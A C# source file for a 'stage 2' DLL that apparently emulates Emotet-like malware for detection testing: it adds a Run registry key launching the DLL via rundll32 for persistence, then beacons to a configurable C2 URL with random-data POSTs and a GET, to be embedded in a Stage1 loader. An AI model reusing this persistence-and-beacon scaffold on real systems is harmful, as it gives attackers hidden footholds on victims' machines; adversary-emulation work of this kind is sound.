using Microsoft.Win32;
using System.Net;
using System.Text;
using System.Threading;
using System;
// This stage 2 DLL simulates a C2 callback and creates a registry key for persistence. 
// You should start this by compiling this file after modifying it to your desired parameters, and specifically make sure you enter a web url to go to in "c2url" that will accept a POST (recommended to start your own elastic beanstalk server).
// Compile this file as a dll using dllcompile.ps1
// Add it as a resource file to Stage1.cpp

namespace name
{
    public class tClass
    {
        //Change the below three values to modify the registry key that is checked/created for persistence.
        const string RegKeyName = "persist";
        const string RegKeyValue = @"rundll32.exe C:\ProgramData\notemotet.dll,DllRegisterServer";
        const string RegKeyLocation = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        const string c2url = ""; //Spin up a python elasticbeanstalk server
        const int byteArrMinLength = 1000;
        const int byteArrMaxLength = 10000;
        const int DelayBetweenWebReqs = 5000; //Delay in miliseconds, so 1000 = 1s
        const int AdditionalPosts = 1; // Hardcoded to make a post, sleep, and then a get request.
                                       // Then for each # specificed here it will make an additional post.
        public static void Main()
        { //checks if registry key for autorun exists, and if not it creates it.
            using (var root = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
            {
                using (var key = root.OpenSubKey(RegKeyLocation, true))
                {
                    var myVal = key.GetValue(RegKeyName); // checks if registry key exists
                    if (myVal == null)
                    {
                        key.SetValue(RegKeyName, RegKeyValue); // creates key if doesn't exist
                    }
                }
            }
            SendWebPost(); // To emulate general C2 traffic, start with always POST and then GET.
            Thread.Sleep(DelayBetweenWebReqs); // Pauses program for input in milliseconds 
            SendWebGet();

            for (int i = 0; i < AdditionalPosts; i++) // Send additional posts specified in the AdditionalPosts const.
            {
                Thread.Sleep(DelayBetweenWebReqs);
                SendWebPost();
            }
        }
        public static void SendWebGet()
        {
            WebClient client = new WebClient();
            string downloadString = client.DownloadString(c2url); // GET request
            System.Diagnostics.Debug.WriteLine(downloadString);

        }
        public static void SendWebPost()
        {
            WebClient client = new WebClient();
            byte[] bytearr1 = GetByteArray(byteArrMinLength, byteArrMaxLength);
            string bytestr1 = Encoding.UTF8.GetString(bytearr1);
            client.UploadString(c2url, bytestr1); // POST with random data
        }
        public static byte[] GetByteArray(int int1, int int2)
        {
            //Takes two integers and returns a byte array of a randomly generated length between the two ints
            Random rnd = new Random();
            byte[] b = new byte[rnd.Next(int1, int2)]; // creates range of bytes between these two ints
            rnd.NextBytes(b);
            return b;
        }
    }
}
